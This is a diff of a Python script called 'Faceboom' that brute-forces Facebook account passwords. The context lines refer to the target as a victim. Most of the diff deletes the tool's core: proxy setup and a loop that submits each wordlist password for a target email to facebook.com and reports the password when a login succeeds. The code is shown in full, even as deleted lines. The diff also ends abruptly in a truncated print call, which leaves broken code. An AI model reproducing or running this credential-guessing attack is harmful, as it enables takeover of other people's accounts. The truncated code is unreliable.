@@ -87,7 +87,8 @@ def ID(url):
         idis = idre.findall(con)
         print(gr + "\n[" + wi + "*" + gr + "] Target Profile" + wi + " ID: " + yl + idis[0] + wi)
     except IndexError:
-        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Please Check Your Victem Profile URL " + rd + "!!!" + wi)
+        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Please Check Your Victem Profile URL " + rd + "!!!"
+              + wi)
         exit(1)
 
 
@@ -100,7 +101,8 @@ def FBOM(username, wordlist, proxy=None, passwd=None):
                 wordlist) + yl + " ] " + rd + "!!!" + wi)
             exit(1)
     if cnet() != True:
-        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Please Check Your Intenrnet Connection " + rd + "!!!" + wi)
+        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Please Check Your Intenrnet Connection " + rd + "!!!"
+              + wi)
         exit(1)
 
     if proxy != None:
@@ -118,134 +120,4 @@ def FBOM(username, wordlist, proxy=None, passwd=None):
                     else:
                         print(rd + "[" + yl + "Connection Failed" + rd + "] !!!" + wi)
                         useproxy = False
-                        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Invalid HTTP/S Proxy[" + rd + str(
-                            proxy) + yl + "]" + rd + " !!!" + wi)
-                        exit(1)
-            else:
-                useproxy = False
-                print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + "Invalid IPv4 [" + rd + str(
-                    proxy) + yl + "] " + rd + "!!!" + wi)
-                exit(1)
-        else:
-            proxy, port = proxy.split(":")
-            if proxy.count(".") == 3:
-                if not port.isdigit() or int(port) < 0 or int(port) > 65535:
-                    print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Invalid Port [" + rd + port + yl + "] Should Be In Range(" + wi + "0-65535" + yl + ")" + rd + "!!!" + wi)
-                    exit(1)
-                if cpro(proxy, port=port) == True:
-                    print(wi + "[" + gr + "Connected" + wi + "]")
-                    useproxy = proxy + ":" + port
-                else:
-                    print(rd + "[" + yl + "Connection Failed" + rd + "] !!!" + wi)
-                    useproxy = False
-                    print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Invalid HTTP/S Proxy[" + rd + str(
-                        proxy) + yl + "]" + rd + " !!!" + wi)
-                    exit(1)
-            else:
-                useproxy = False
-                print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Invalid IPv4 [" + rd + str(
-                    proxy) + yl + "] " + rd + "!!!" + wi)
-                exit(1)
-    else:  # CLI GUI parameters
-        useproxy = False
-    prox = gr + useproxy.split(":")[0] + wi + ":" + yl + useproxy.split(":")[1] if useproxy != False else ""
-    proxystatus = prox + wi + "[" + gr + "ON" + wi + "]" if useproxy != False else yl + "[" + rd + "OFF" + yl + "]"
-    print(gr + """
-----------------------------------
-[---]        """ + wi + """Faceboom""" + gr + """         [---]
-----------------------------------
-[---]  """ + wi + """Brute Forcing Facebook  """ + gr + """ [---]
-----------------------------------
-[---]         """ + yl + """CONFIG""" + gr + """         [---]
-----------------------------------
-[>] Target      :> """ + wi + username + gr + """
-{}""".format("[>] Wordlist    :> " + yl + str(wordlist) if passwd == None else "[>] Password    :> " + yl + str(
-        passwd)) + gr + """
-[>] ProxyStatus :> """ + str(proxystatus) + gr + """      
-----------------------------------""" + wi + """
-[~] """ + yl + """Brute""" + rd + """ Force Attack: """ + gr + """Enabled """ + wi + """[~]""" + gr + """
-----------------------------------
-""")
-    loop = 1
-    br = mechanize.Browser()
-    br.set_handle_robots(False)
-    if useproxy != False:
-        br.set_proxies({'https': useproxy, 'http': useproxy})
-    br.addheaders = [('User-agent', useragent())]
-    issuccess = 0
-    if passwd != None:
-        if not passwd.strip() or len(passwd) < 6:
-            print(yl + "\n[" + rd + "!" + yl + "] Invalid Password [ " + rd + passwd + yl + " ]" + rd + " !!!" + wi)
-            exit(1)
-        passwd = passwd.strip()
-        try:
-            print(wi + "[" + yl + "~" + wi + "] Trying Single Password[ {" + yl + str(passwd) + wi + "} ]")
-            br.open("https://www.facebook.com")
-            br.select_form(nr=0)
-            if 'email' in br.form:
-                br.form["email"] = username
-            else:
-                print(yl + "==> Error:" + rd + " No email field found in the form. Exiting...")
-                exit(1)
-            br.form["pass"] = passwd
-            br.method = "POST"
-            if br.submit().get_data().__contains__('home_icon'):
-                issuccess = 1
-                print(wi + "==> Login" + gr + " Success\n")
-                print(wi + "=========================" + "=" * len(passwd) + "======")
-                print(wi + "[" + gr + "+" + wi + "] Password [ " + gr + passwd + wi + " ]" + gr + " Is Correct :)")
-                print(wi + "=========================" + "=" * len(passwd) + "======")
-            else:
-                print(yl + "==> Login" + rd + " Failed\n")
-        except (KeyboardInterrupt, EOFError):
-            print(rd + "\n[" + yl + "!" + rd + "]" + yl + " Aborting" + rd + "..." + wi)
-            time.sleep(1.5)
-            issuccess = 2
-        except Exception as e:
-            issuccess = 2
-            print(rd + "\n[" + yl + "!" + rd + "] Error: " + yl + str(e) + wi)
-            time.sleep(0.60)
-
-        if issuccess == 0:
-            print(yl + "\n[" + rd + "!" + yl + "] Sorry: " + wi + "The Password[ " + yl + passwd + wi + " ] Is Not Correct" + rd + ":(" + yl + "!" + wi)
-            print(gr + "[" + yl + "!" + gr + "]" + yl + " Please Try other password or Wordlist File " + gr + ":)" + wi)
-        exit(1)
-    with open(wordlist) as wfile:
-        for passwd in wfile:
-            if not passwd.strip() or len(passwd.strip()) < 6:
-                continue
-            passwd = passwd.strip()
-            try:
-                print(wi + "[" + yl + str(loop) + wi + "] Trying Password[ {" + yl + str(passwd) + wi + "} ]")
-                br.open("https://facebook.com")
-                br.select_form(nr=0)
-                if 'email' in br.form:
-                    br.form["email"] = username
-                else:
-                    print(yl + "==> Error:" + rd + " No email field found in the form. Exiting...")
-                    exit(1)
-                br.form["pass"] = passwd
-                br.method = "POST"
-                if br.submit().get_data().__contains__('home_icon'):
-                    issuccess = 1
-                    print(wi + "==> Login" + gr + " Success\n")
-                    print(wi + "=========================" + "=" * len(passwd))
-                    print(wi + "[" + gr + "+" + wi + "] Password " + gr + "Found:" + wi + ">>>>[ " + gr + "{}".format(passwd))
-                    print(wi + "=========================" + "=" * len(passwd))
-                    break
-                else:
-                    print(yl + "==> Login" + rd + " Failed\n")
-                loop += 1
-            except (KeyboardInterrupt, EOFError):
-                print(rd + "\n[" + yl + "!" + rd + "]" + yl + " Aborting" + rd + "..." + wi)
-                time.sleep(1.5)
-                exit(1)
-            except Exception as e:
-                print(rd + "[" + yl + "!" + rd + "] Error: " + yl + str(e) + wi)
-                time.sleep(0.60)
-
-    if issuccess == 0:
-        print(yl + "\n[" + rd + "!" + yl + "] Sorry: " + wi + "I Can't Find The Correct Password In [ " + yl + wordlist + wi + " ] " + rd + ":(" + yl + "!" + wi)
-        print(gr + "[" + yl + "!" + gr + "]" + y
-
-                   
+                        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl
